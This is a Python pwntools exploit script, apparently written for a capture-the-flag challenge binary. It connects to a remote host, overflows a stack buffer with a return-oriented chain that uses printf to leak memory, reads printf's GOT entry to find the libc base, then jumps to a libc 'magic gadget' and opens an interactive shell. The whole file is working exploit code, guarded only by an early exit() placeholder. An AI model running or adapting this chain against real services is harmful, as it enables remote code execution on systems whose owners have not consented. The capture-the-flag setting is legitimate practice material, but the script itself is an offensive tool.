from pwn import *
import pwnlib

print("First you will need to fill in the required details below.")
exit()

if len(sys.argv) != 4:
        print("Usage: {} <host> <port> <binary>".format(sys.argv[0]))
        exit()

context(arch = 'amd64', os = 'linux')
binary=ELF(sys.argv[3])

greeting = "Welcome! What's your name? "
execme = "Congrats, you have EIP control. Now you just need a shellcode.\n"
buf_rbp_off = 0x100
pop_rdi_ret = 0x11263
pop_rsi_pop_r15_ret = 0x11261
format_s = 0x102cc
printf_plt = 0x112c0
printf_got = 0x13028
printf_off = 350208 # from libc base
magic_off = 0xef6c4 # libc magic gadget

r=remote(sys.argv[1], int(sys.argv[2]))

r.recvuntil(greeting)

@pwnlib.memleak.MemLeak.String
def leak(addr):
	off=0

	if addr&0xff==0x20 or addr&0xff==0x0d:
		off=2
		addr-=2

	if set(p64(addr)) & set(string.whitespace):
		log.info("Can't leak address {}".format(hex(addr)))
		return None

	r.send("XYZ\x00")
	r.send('A'*(buf_rbp_off-4))
	r.send('RBP__RBP')

	r.send(p64(pop_rdi_ret))
	r.send(p64(format_s))
	r.send(p64(pop_rsi_pop_r15_ret))
	r.send(p64(addr))
	r.send('R15__R15')
	r.send(p64(printf_plt))
	r.send(p64(binary.symbols['execute_me']))
	r.send('\n')
	r.recvuntil("Hello, XYZ!\n")
	return r.recvuntil(execme, True)[off:]

sanity = leak.s(format_s)
print("Sanity check: leaked '{}', expected '%s'".format(sanity))
if sanity != '%s':
        print('Sanity check failed!')
        exit()

libc_printf = leak.p(printf_got)
print('GOT entry for printf contains: 0x{}'.format(libc_printf))

libc_base = libc_printf - printf_off
print('libc base: 0x{:x}'.format(libc_base))

magic = libc_base + magic_off
print("magic gadget: 0x{:x} + 0x{:x} = 0x{:x}".format(libc_base, magic_off, magic))

r.send("YZX\x00")
r.send('A'*(buf_rbp_off-4))
r.send('RBP__RBP')

r.send(p64(pop_rdi_ret))
r.send(p64(pop_rdi_ret))

r.send(p64(binary.symbols['execute_me']))
r.send(p64(magic))
r.send("\n")

r.interactive()
